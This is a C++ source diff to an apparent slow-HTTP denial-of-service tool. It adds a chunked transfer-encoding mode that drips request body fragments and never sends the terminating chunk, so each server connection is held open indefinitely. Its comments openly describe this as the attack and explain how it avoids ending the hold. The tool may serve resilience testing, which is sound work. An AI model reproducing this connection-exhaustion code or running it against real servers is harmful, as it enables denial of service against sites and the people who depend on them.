@@ -5,6 +5,8 @@
 #include "slowhttp/request.hpp"
 
 #include <cstddef>
+#include <cstdio>
+#include <utility>
 
 namespace slowhttp {
 namespace {
@@ -18,8 +20,8 @@ SlowBody::SlowBody(const Config& cfg)
       // A caller-supplied payload replaces the placeholder entirely: endpoints
       // that validate their input reject "foo=bar" before the hold can bite, so
       // the whole attack lands on a 400 handler instead of the real one.
-      opening_body_bytes_(cfg.body_data.empty() ? std::string(kOpeningBody)
-                                                : cfg.body_data),
+      opening_body_bytes_(frame(cfg.body_data.empty() ? std::string(kOpeningBody)
+                                                      : cfg.body_data)),
       headers_(build_headers()),
       opening_body_(opening_body_bytes_.size()),
       interval_(std::chrono::duration_cast<Millis>(cfg.interval)),
@@ -38,13 +40,19 @@ Action SlowBody::on_connect(ConnId id) {
 }
 
 Action SlowBody::on_timer(ConnId id) {
-  std::string chunk = followup_chunk();
+  std::string chunk = frame(followup_chunk());
   if (id >= 0 && static_cast<std::size_t>(id) < body_sent_.size()) {
-    const std::size_t limit = static_cast<std::size_t>(cfg_.content_length);
-    // Completing the body would hand the server a finished request, which it
-    // would answer and close -- ending the hold. Start a fresh connection instead
-    // of finishing the one we have.
-    if (body_sent_[id] + chunk.size() >= limit) return Action::reconnect();
+    // Chunked framing has no declared length to run out of. The request ends at
+    // the terminating zero-length chunk and nowhere else, and that chunk is
+    // never sent -- so there is no point at which this connection must be
+    // recycled to keep the hold, and it simply runs until the test ends.
+    if (!cfg_.chunked) {
+      const std::size_t limit = static_cast<std::size_t>(cfg_.content_length);
+      // Completing the body would hand the server a finished request, which it
+      // would answer and close -- ending the hold. Start a fresh connection
+      // instead of finishing the one we have.
+      if (body_sent_[id] + chunk.size() >= limit) return Action::reconnect();
+    }
     body_sent_[id] += chunk.size();
   }
   return Action::send(std::move(chunk), interval_);
@@ -60,9 +68,16 @@ std::string SlowBody::build_headers() const {
   std::string req;
   req.reserve(320);
   RequestSpec spec = RequestSpec::from(cfg_);
-  // The promise the server will wait on: far more body than we intend to send.
-  // This is the attack; everything else about the request is ordinary.
-  spec.set("Content-Length", std::to_string(cfg_.content_length));
+  if (cfg_.chunked) {
+    // No Content-Length at all. Sending both is the request-smuggling desync
+    // (RFC 9112 6.1), and a server that rejects the pair would look like a
+    // target defending itself when it is really refusing malformed input.
+    spec.set("Transfer-Encoding", "chunked");
+  } else {
+    // The promise the server will wait on: far more body than we intend to
+    // send. This is the attack; everything else about the request is ordinary.
+    spec.set("Content-Length", std::to_string(cfg_.content_length));
+  }
   spec.set("Content-Type", cfg_.content_type);
   spec.set("Connection", "close");
   req += spec.serialize_http11();
@@ -93,6 +108,23 @@ std::string SlowBody::random_token(int max_len) {
   s.reserve(n);
   for (int i = 0; i < n; ++i) s += kAlphabet[ch_dist(rng_)];
   return s;
+}
+
+std::string chunk_frame(const std::string& body) {
+  // A zero-length fragment would encode as the terminating chunk and end the
+  // request -- the one thing this attack must never send -- so it produces
+  // nothing at all rather than being framed.
+  if (body.empty()) return std::string();
+  char size[24];
+  std::snprintf(size, sizeof(size), "%zx\r\n", body.size());
+  std::string out(size);
+  out += body;
+  out += "\r\n";
+  return out;
+}
+
+std::string SlowBody::frame(std::string body) const {
+  return cfg_.chunked ? chunk_frame(body) : body;
 }
 
 }  // namespace slowhttp
